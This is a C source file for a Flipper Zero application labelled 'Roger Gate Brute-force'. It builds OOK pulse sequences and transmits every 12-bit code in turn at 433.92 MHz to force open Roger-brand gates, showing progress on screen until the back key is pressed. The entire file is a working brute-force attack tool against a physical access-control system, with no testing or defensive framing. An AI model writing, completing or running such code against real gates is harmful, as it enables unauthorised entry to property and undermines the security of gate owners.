// Roger Gate Brute-force App for Flipper Zero
#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_subghz.h>
#include <gui/gui.h>
#include <gui/view_port.h>
#include <input/input.h>

#define ROGER_FREQ     433920000
#define MAX_ATTEMPTS   4096
#define SEND_DELAY_US  50000

// ── Pulse timing (LevelDuration packs level + µs duration into one uint32_t) ─
#define BIT1_ON_US   600
#define BIT1_OFF_US  200
#define BIT0_ON_US   200
#define BIT0_OFF_US  600
#define SYNC_ON_US   100
#define SYNC_OFF_US  3100

// ── Transmit state passed to the async callback ──────────────────────────────
typedef struct {
    LevelDuration* sequence;   // pre-built pulse sequence
    size_t         length;     // total number of LevelDuration entries
    size_t         index;      // current position in sequence
    FuriSemaphore* done_sem;   // signalled when sequence is exhausted
} TxState;

// ── Async TX callback — called by the HAL to fetch the next sample ───────────
static LevelDuration tx_callback(void* ctx) {
    TxState* s = ctx;
    if(s->index < s->length) {
        return s->sequence[s->index++];
    }
    // End of sequence: return silence and signal completion
    furi_semaphore_release(s->done_sem);
    return level_duration_reset(); // tells HAL we are done
}

// ── Build LevelDuration sequence for one 12-bit Roger-gate code ──────────────
//    Sequence: sync pair + 12 bit pairs + trailing high = 27 entries
static size_t build_sequence(uint16_t code, LevelDuration* seq, size_t seq_len) {
    if(seq_len < 27) return 0;
    size_t i = 0;

    // Sync pulse
    seq[i++] = level_duration_make(true,  SYNC_ON_US);
    seq[i++] = level_duration_make(false, SYNC_OFF_US);

    // 12 data bits, MSB first
    for(int b = 11; b >= 0; b--) {
        if((code >> b) & 1) {
            seq[i++] = level_duration_make(true,  BIT1_ON_US);
            seq[i++] = level_duration_make(false, BIT1_OFF_US);
        } else {
            seq[i++] = level_duration_make(true,  BIT0_ON_US);
            seq[i++] = level_duration_make(false, BIT0_OFF_US);
        }
    }

    // Trailing high to close the last bit
    seq[i++] = level_duration_make(true, BIT1_ON_US);

    return i;
}

// ── Transmit one code word ────────────────────────────────────────────────────
static void send_code(uint16_t code) {
    LevelDuration seq[27];
    size_t seq_len = build_sequence(code, seq, 27);
    if(seq_len == 0) return;

    TxState state = {
        .sequence = seq,
        .length   = seq_len,
        .index    = 0,
        .done_sem = furi_semaphore_alloc(1, 0), // max=1, initial=0
    };

    // Configure radio
    furi_hal_subghz_reset();
    furi_hal_subghz_load_preset(FuriHalSubGhzPresetOok270Async);
    furi_hal_subghz_set_frequency_and_path(ROGER_FREQ);
    furi_hal_subghz_tx(); // switch to TX mode

    // Start async transmission
    furi_hal_subghz_start_async_tx(tx_callback, &state);

    // Wait for callback to signal completion (200 ms max)
    furi_semaphore_acquire(state.done_sem, furi_ms_to_ticks(200));

    furi_hal_subghz_stop_async_tx();
    furi_hal_subghz_sleep();
    furi_semaphore_free(state.done_sem);

    furi_delay_us(SEND_DELAY_US);
}

// ── App context ───────────────────────────────────────────────────────────────
typedef struct {
    FuriMessageQueue* input_queue;
    volatile bool     stop;
    uint16_t          current_code;
} AppCtx;

// ── Draw callback ─────────────────────────────────────────────────────────────
static void draw_cb(Canvas* canvas, void* ctx) {
    AppCtx* app = ctx;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 15, "Roger Gate BF");
    canvas_set_font(canvas, FontSecondary);

    char buf[32];
    snprintf(buf, sizeof(buf), "Code: %04X / FFF", app->current_code);
    canvas_draw_str(canvas, 5, 30, buf);
    canvas_draw_str(canvas, 5, 45, "BACK to stop");
}

// ── Input callback ────────────────────────────────────────────────────────────
static void input_cb(InputEvent* event, void* ctx) {
    AppCtx* app = ctx;
    furi_message_queue_put(app->input_queue, event, 0);
}

// ── App entry point ───────────────────────────────────────────────────────────
int32_t roger_gate_app(void* p) {
    UNUSED(p);

    AppCtx app = {
        .input_queue  = furi_message_queue_alloc(8, sizeof(InputEvent)),
        .stop         = false,
        .current_code = 0,
    };

    ViewPort* vp = view_port_alloc();
    view_port_draw_callback_set(vp, draw_cb, &app);
    view_port_input_callback_set(vp, input_cb, &app);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, vp, GuiLayerFullscreen);

    while(!app.stop && app.current_code < MAX_ATTEMPTS) {
        send_code(app.current_code);
        view_port_update(vp); // refresh progress on screen

        InputEvent event;
        while(furi_message_queue_get(app.input_queue, &event, 0) == FuriStatusOk) {
            if(event.type == InputTypeShort && event.key == InputKeyBack) {
                app.stop = true;
            }
        }

        app.current_code++;
    }

    // Cleanup
    gui_remove_view_port(gui, vp);
    furi_record_close(RECORD_GUI);
    view_port_free(vp);
    furi_message_queue_free(app.input_queue);

    return 0;
}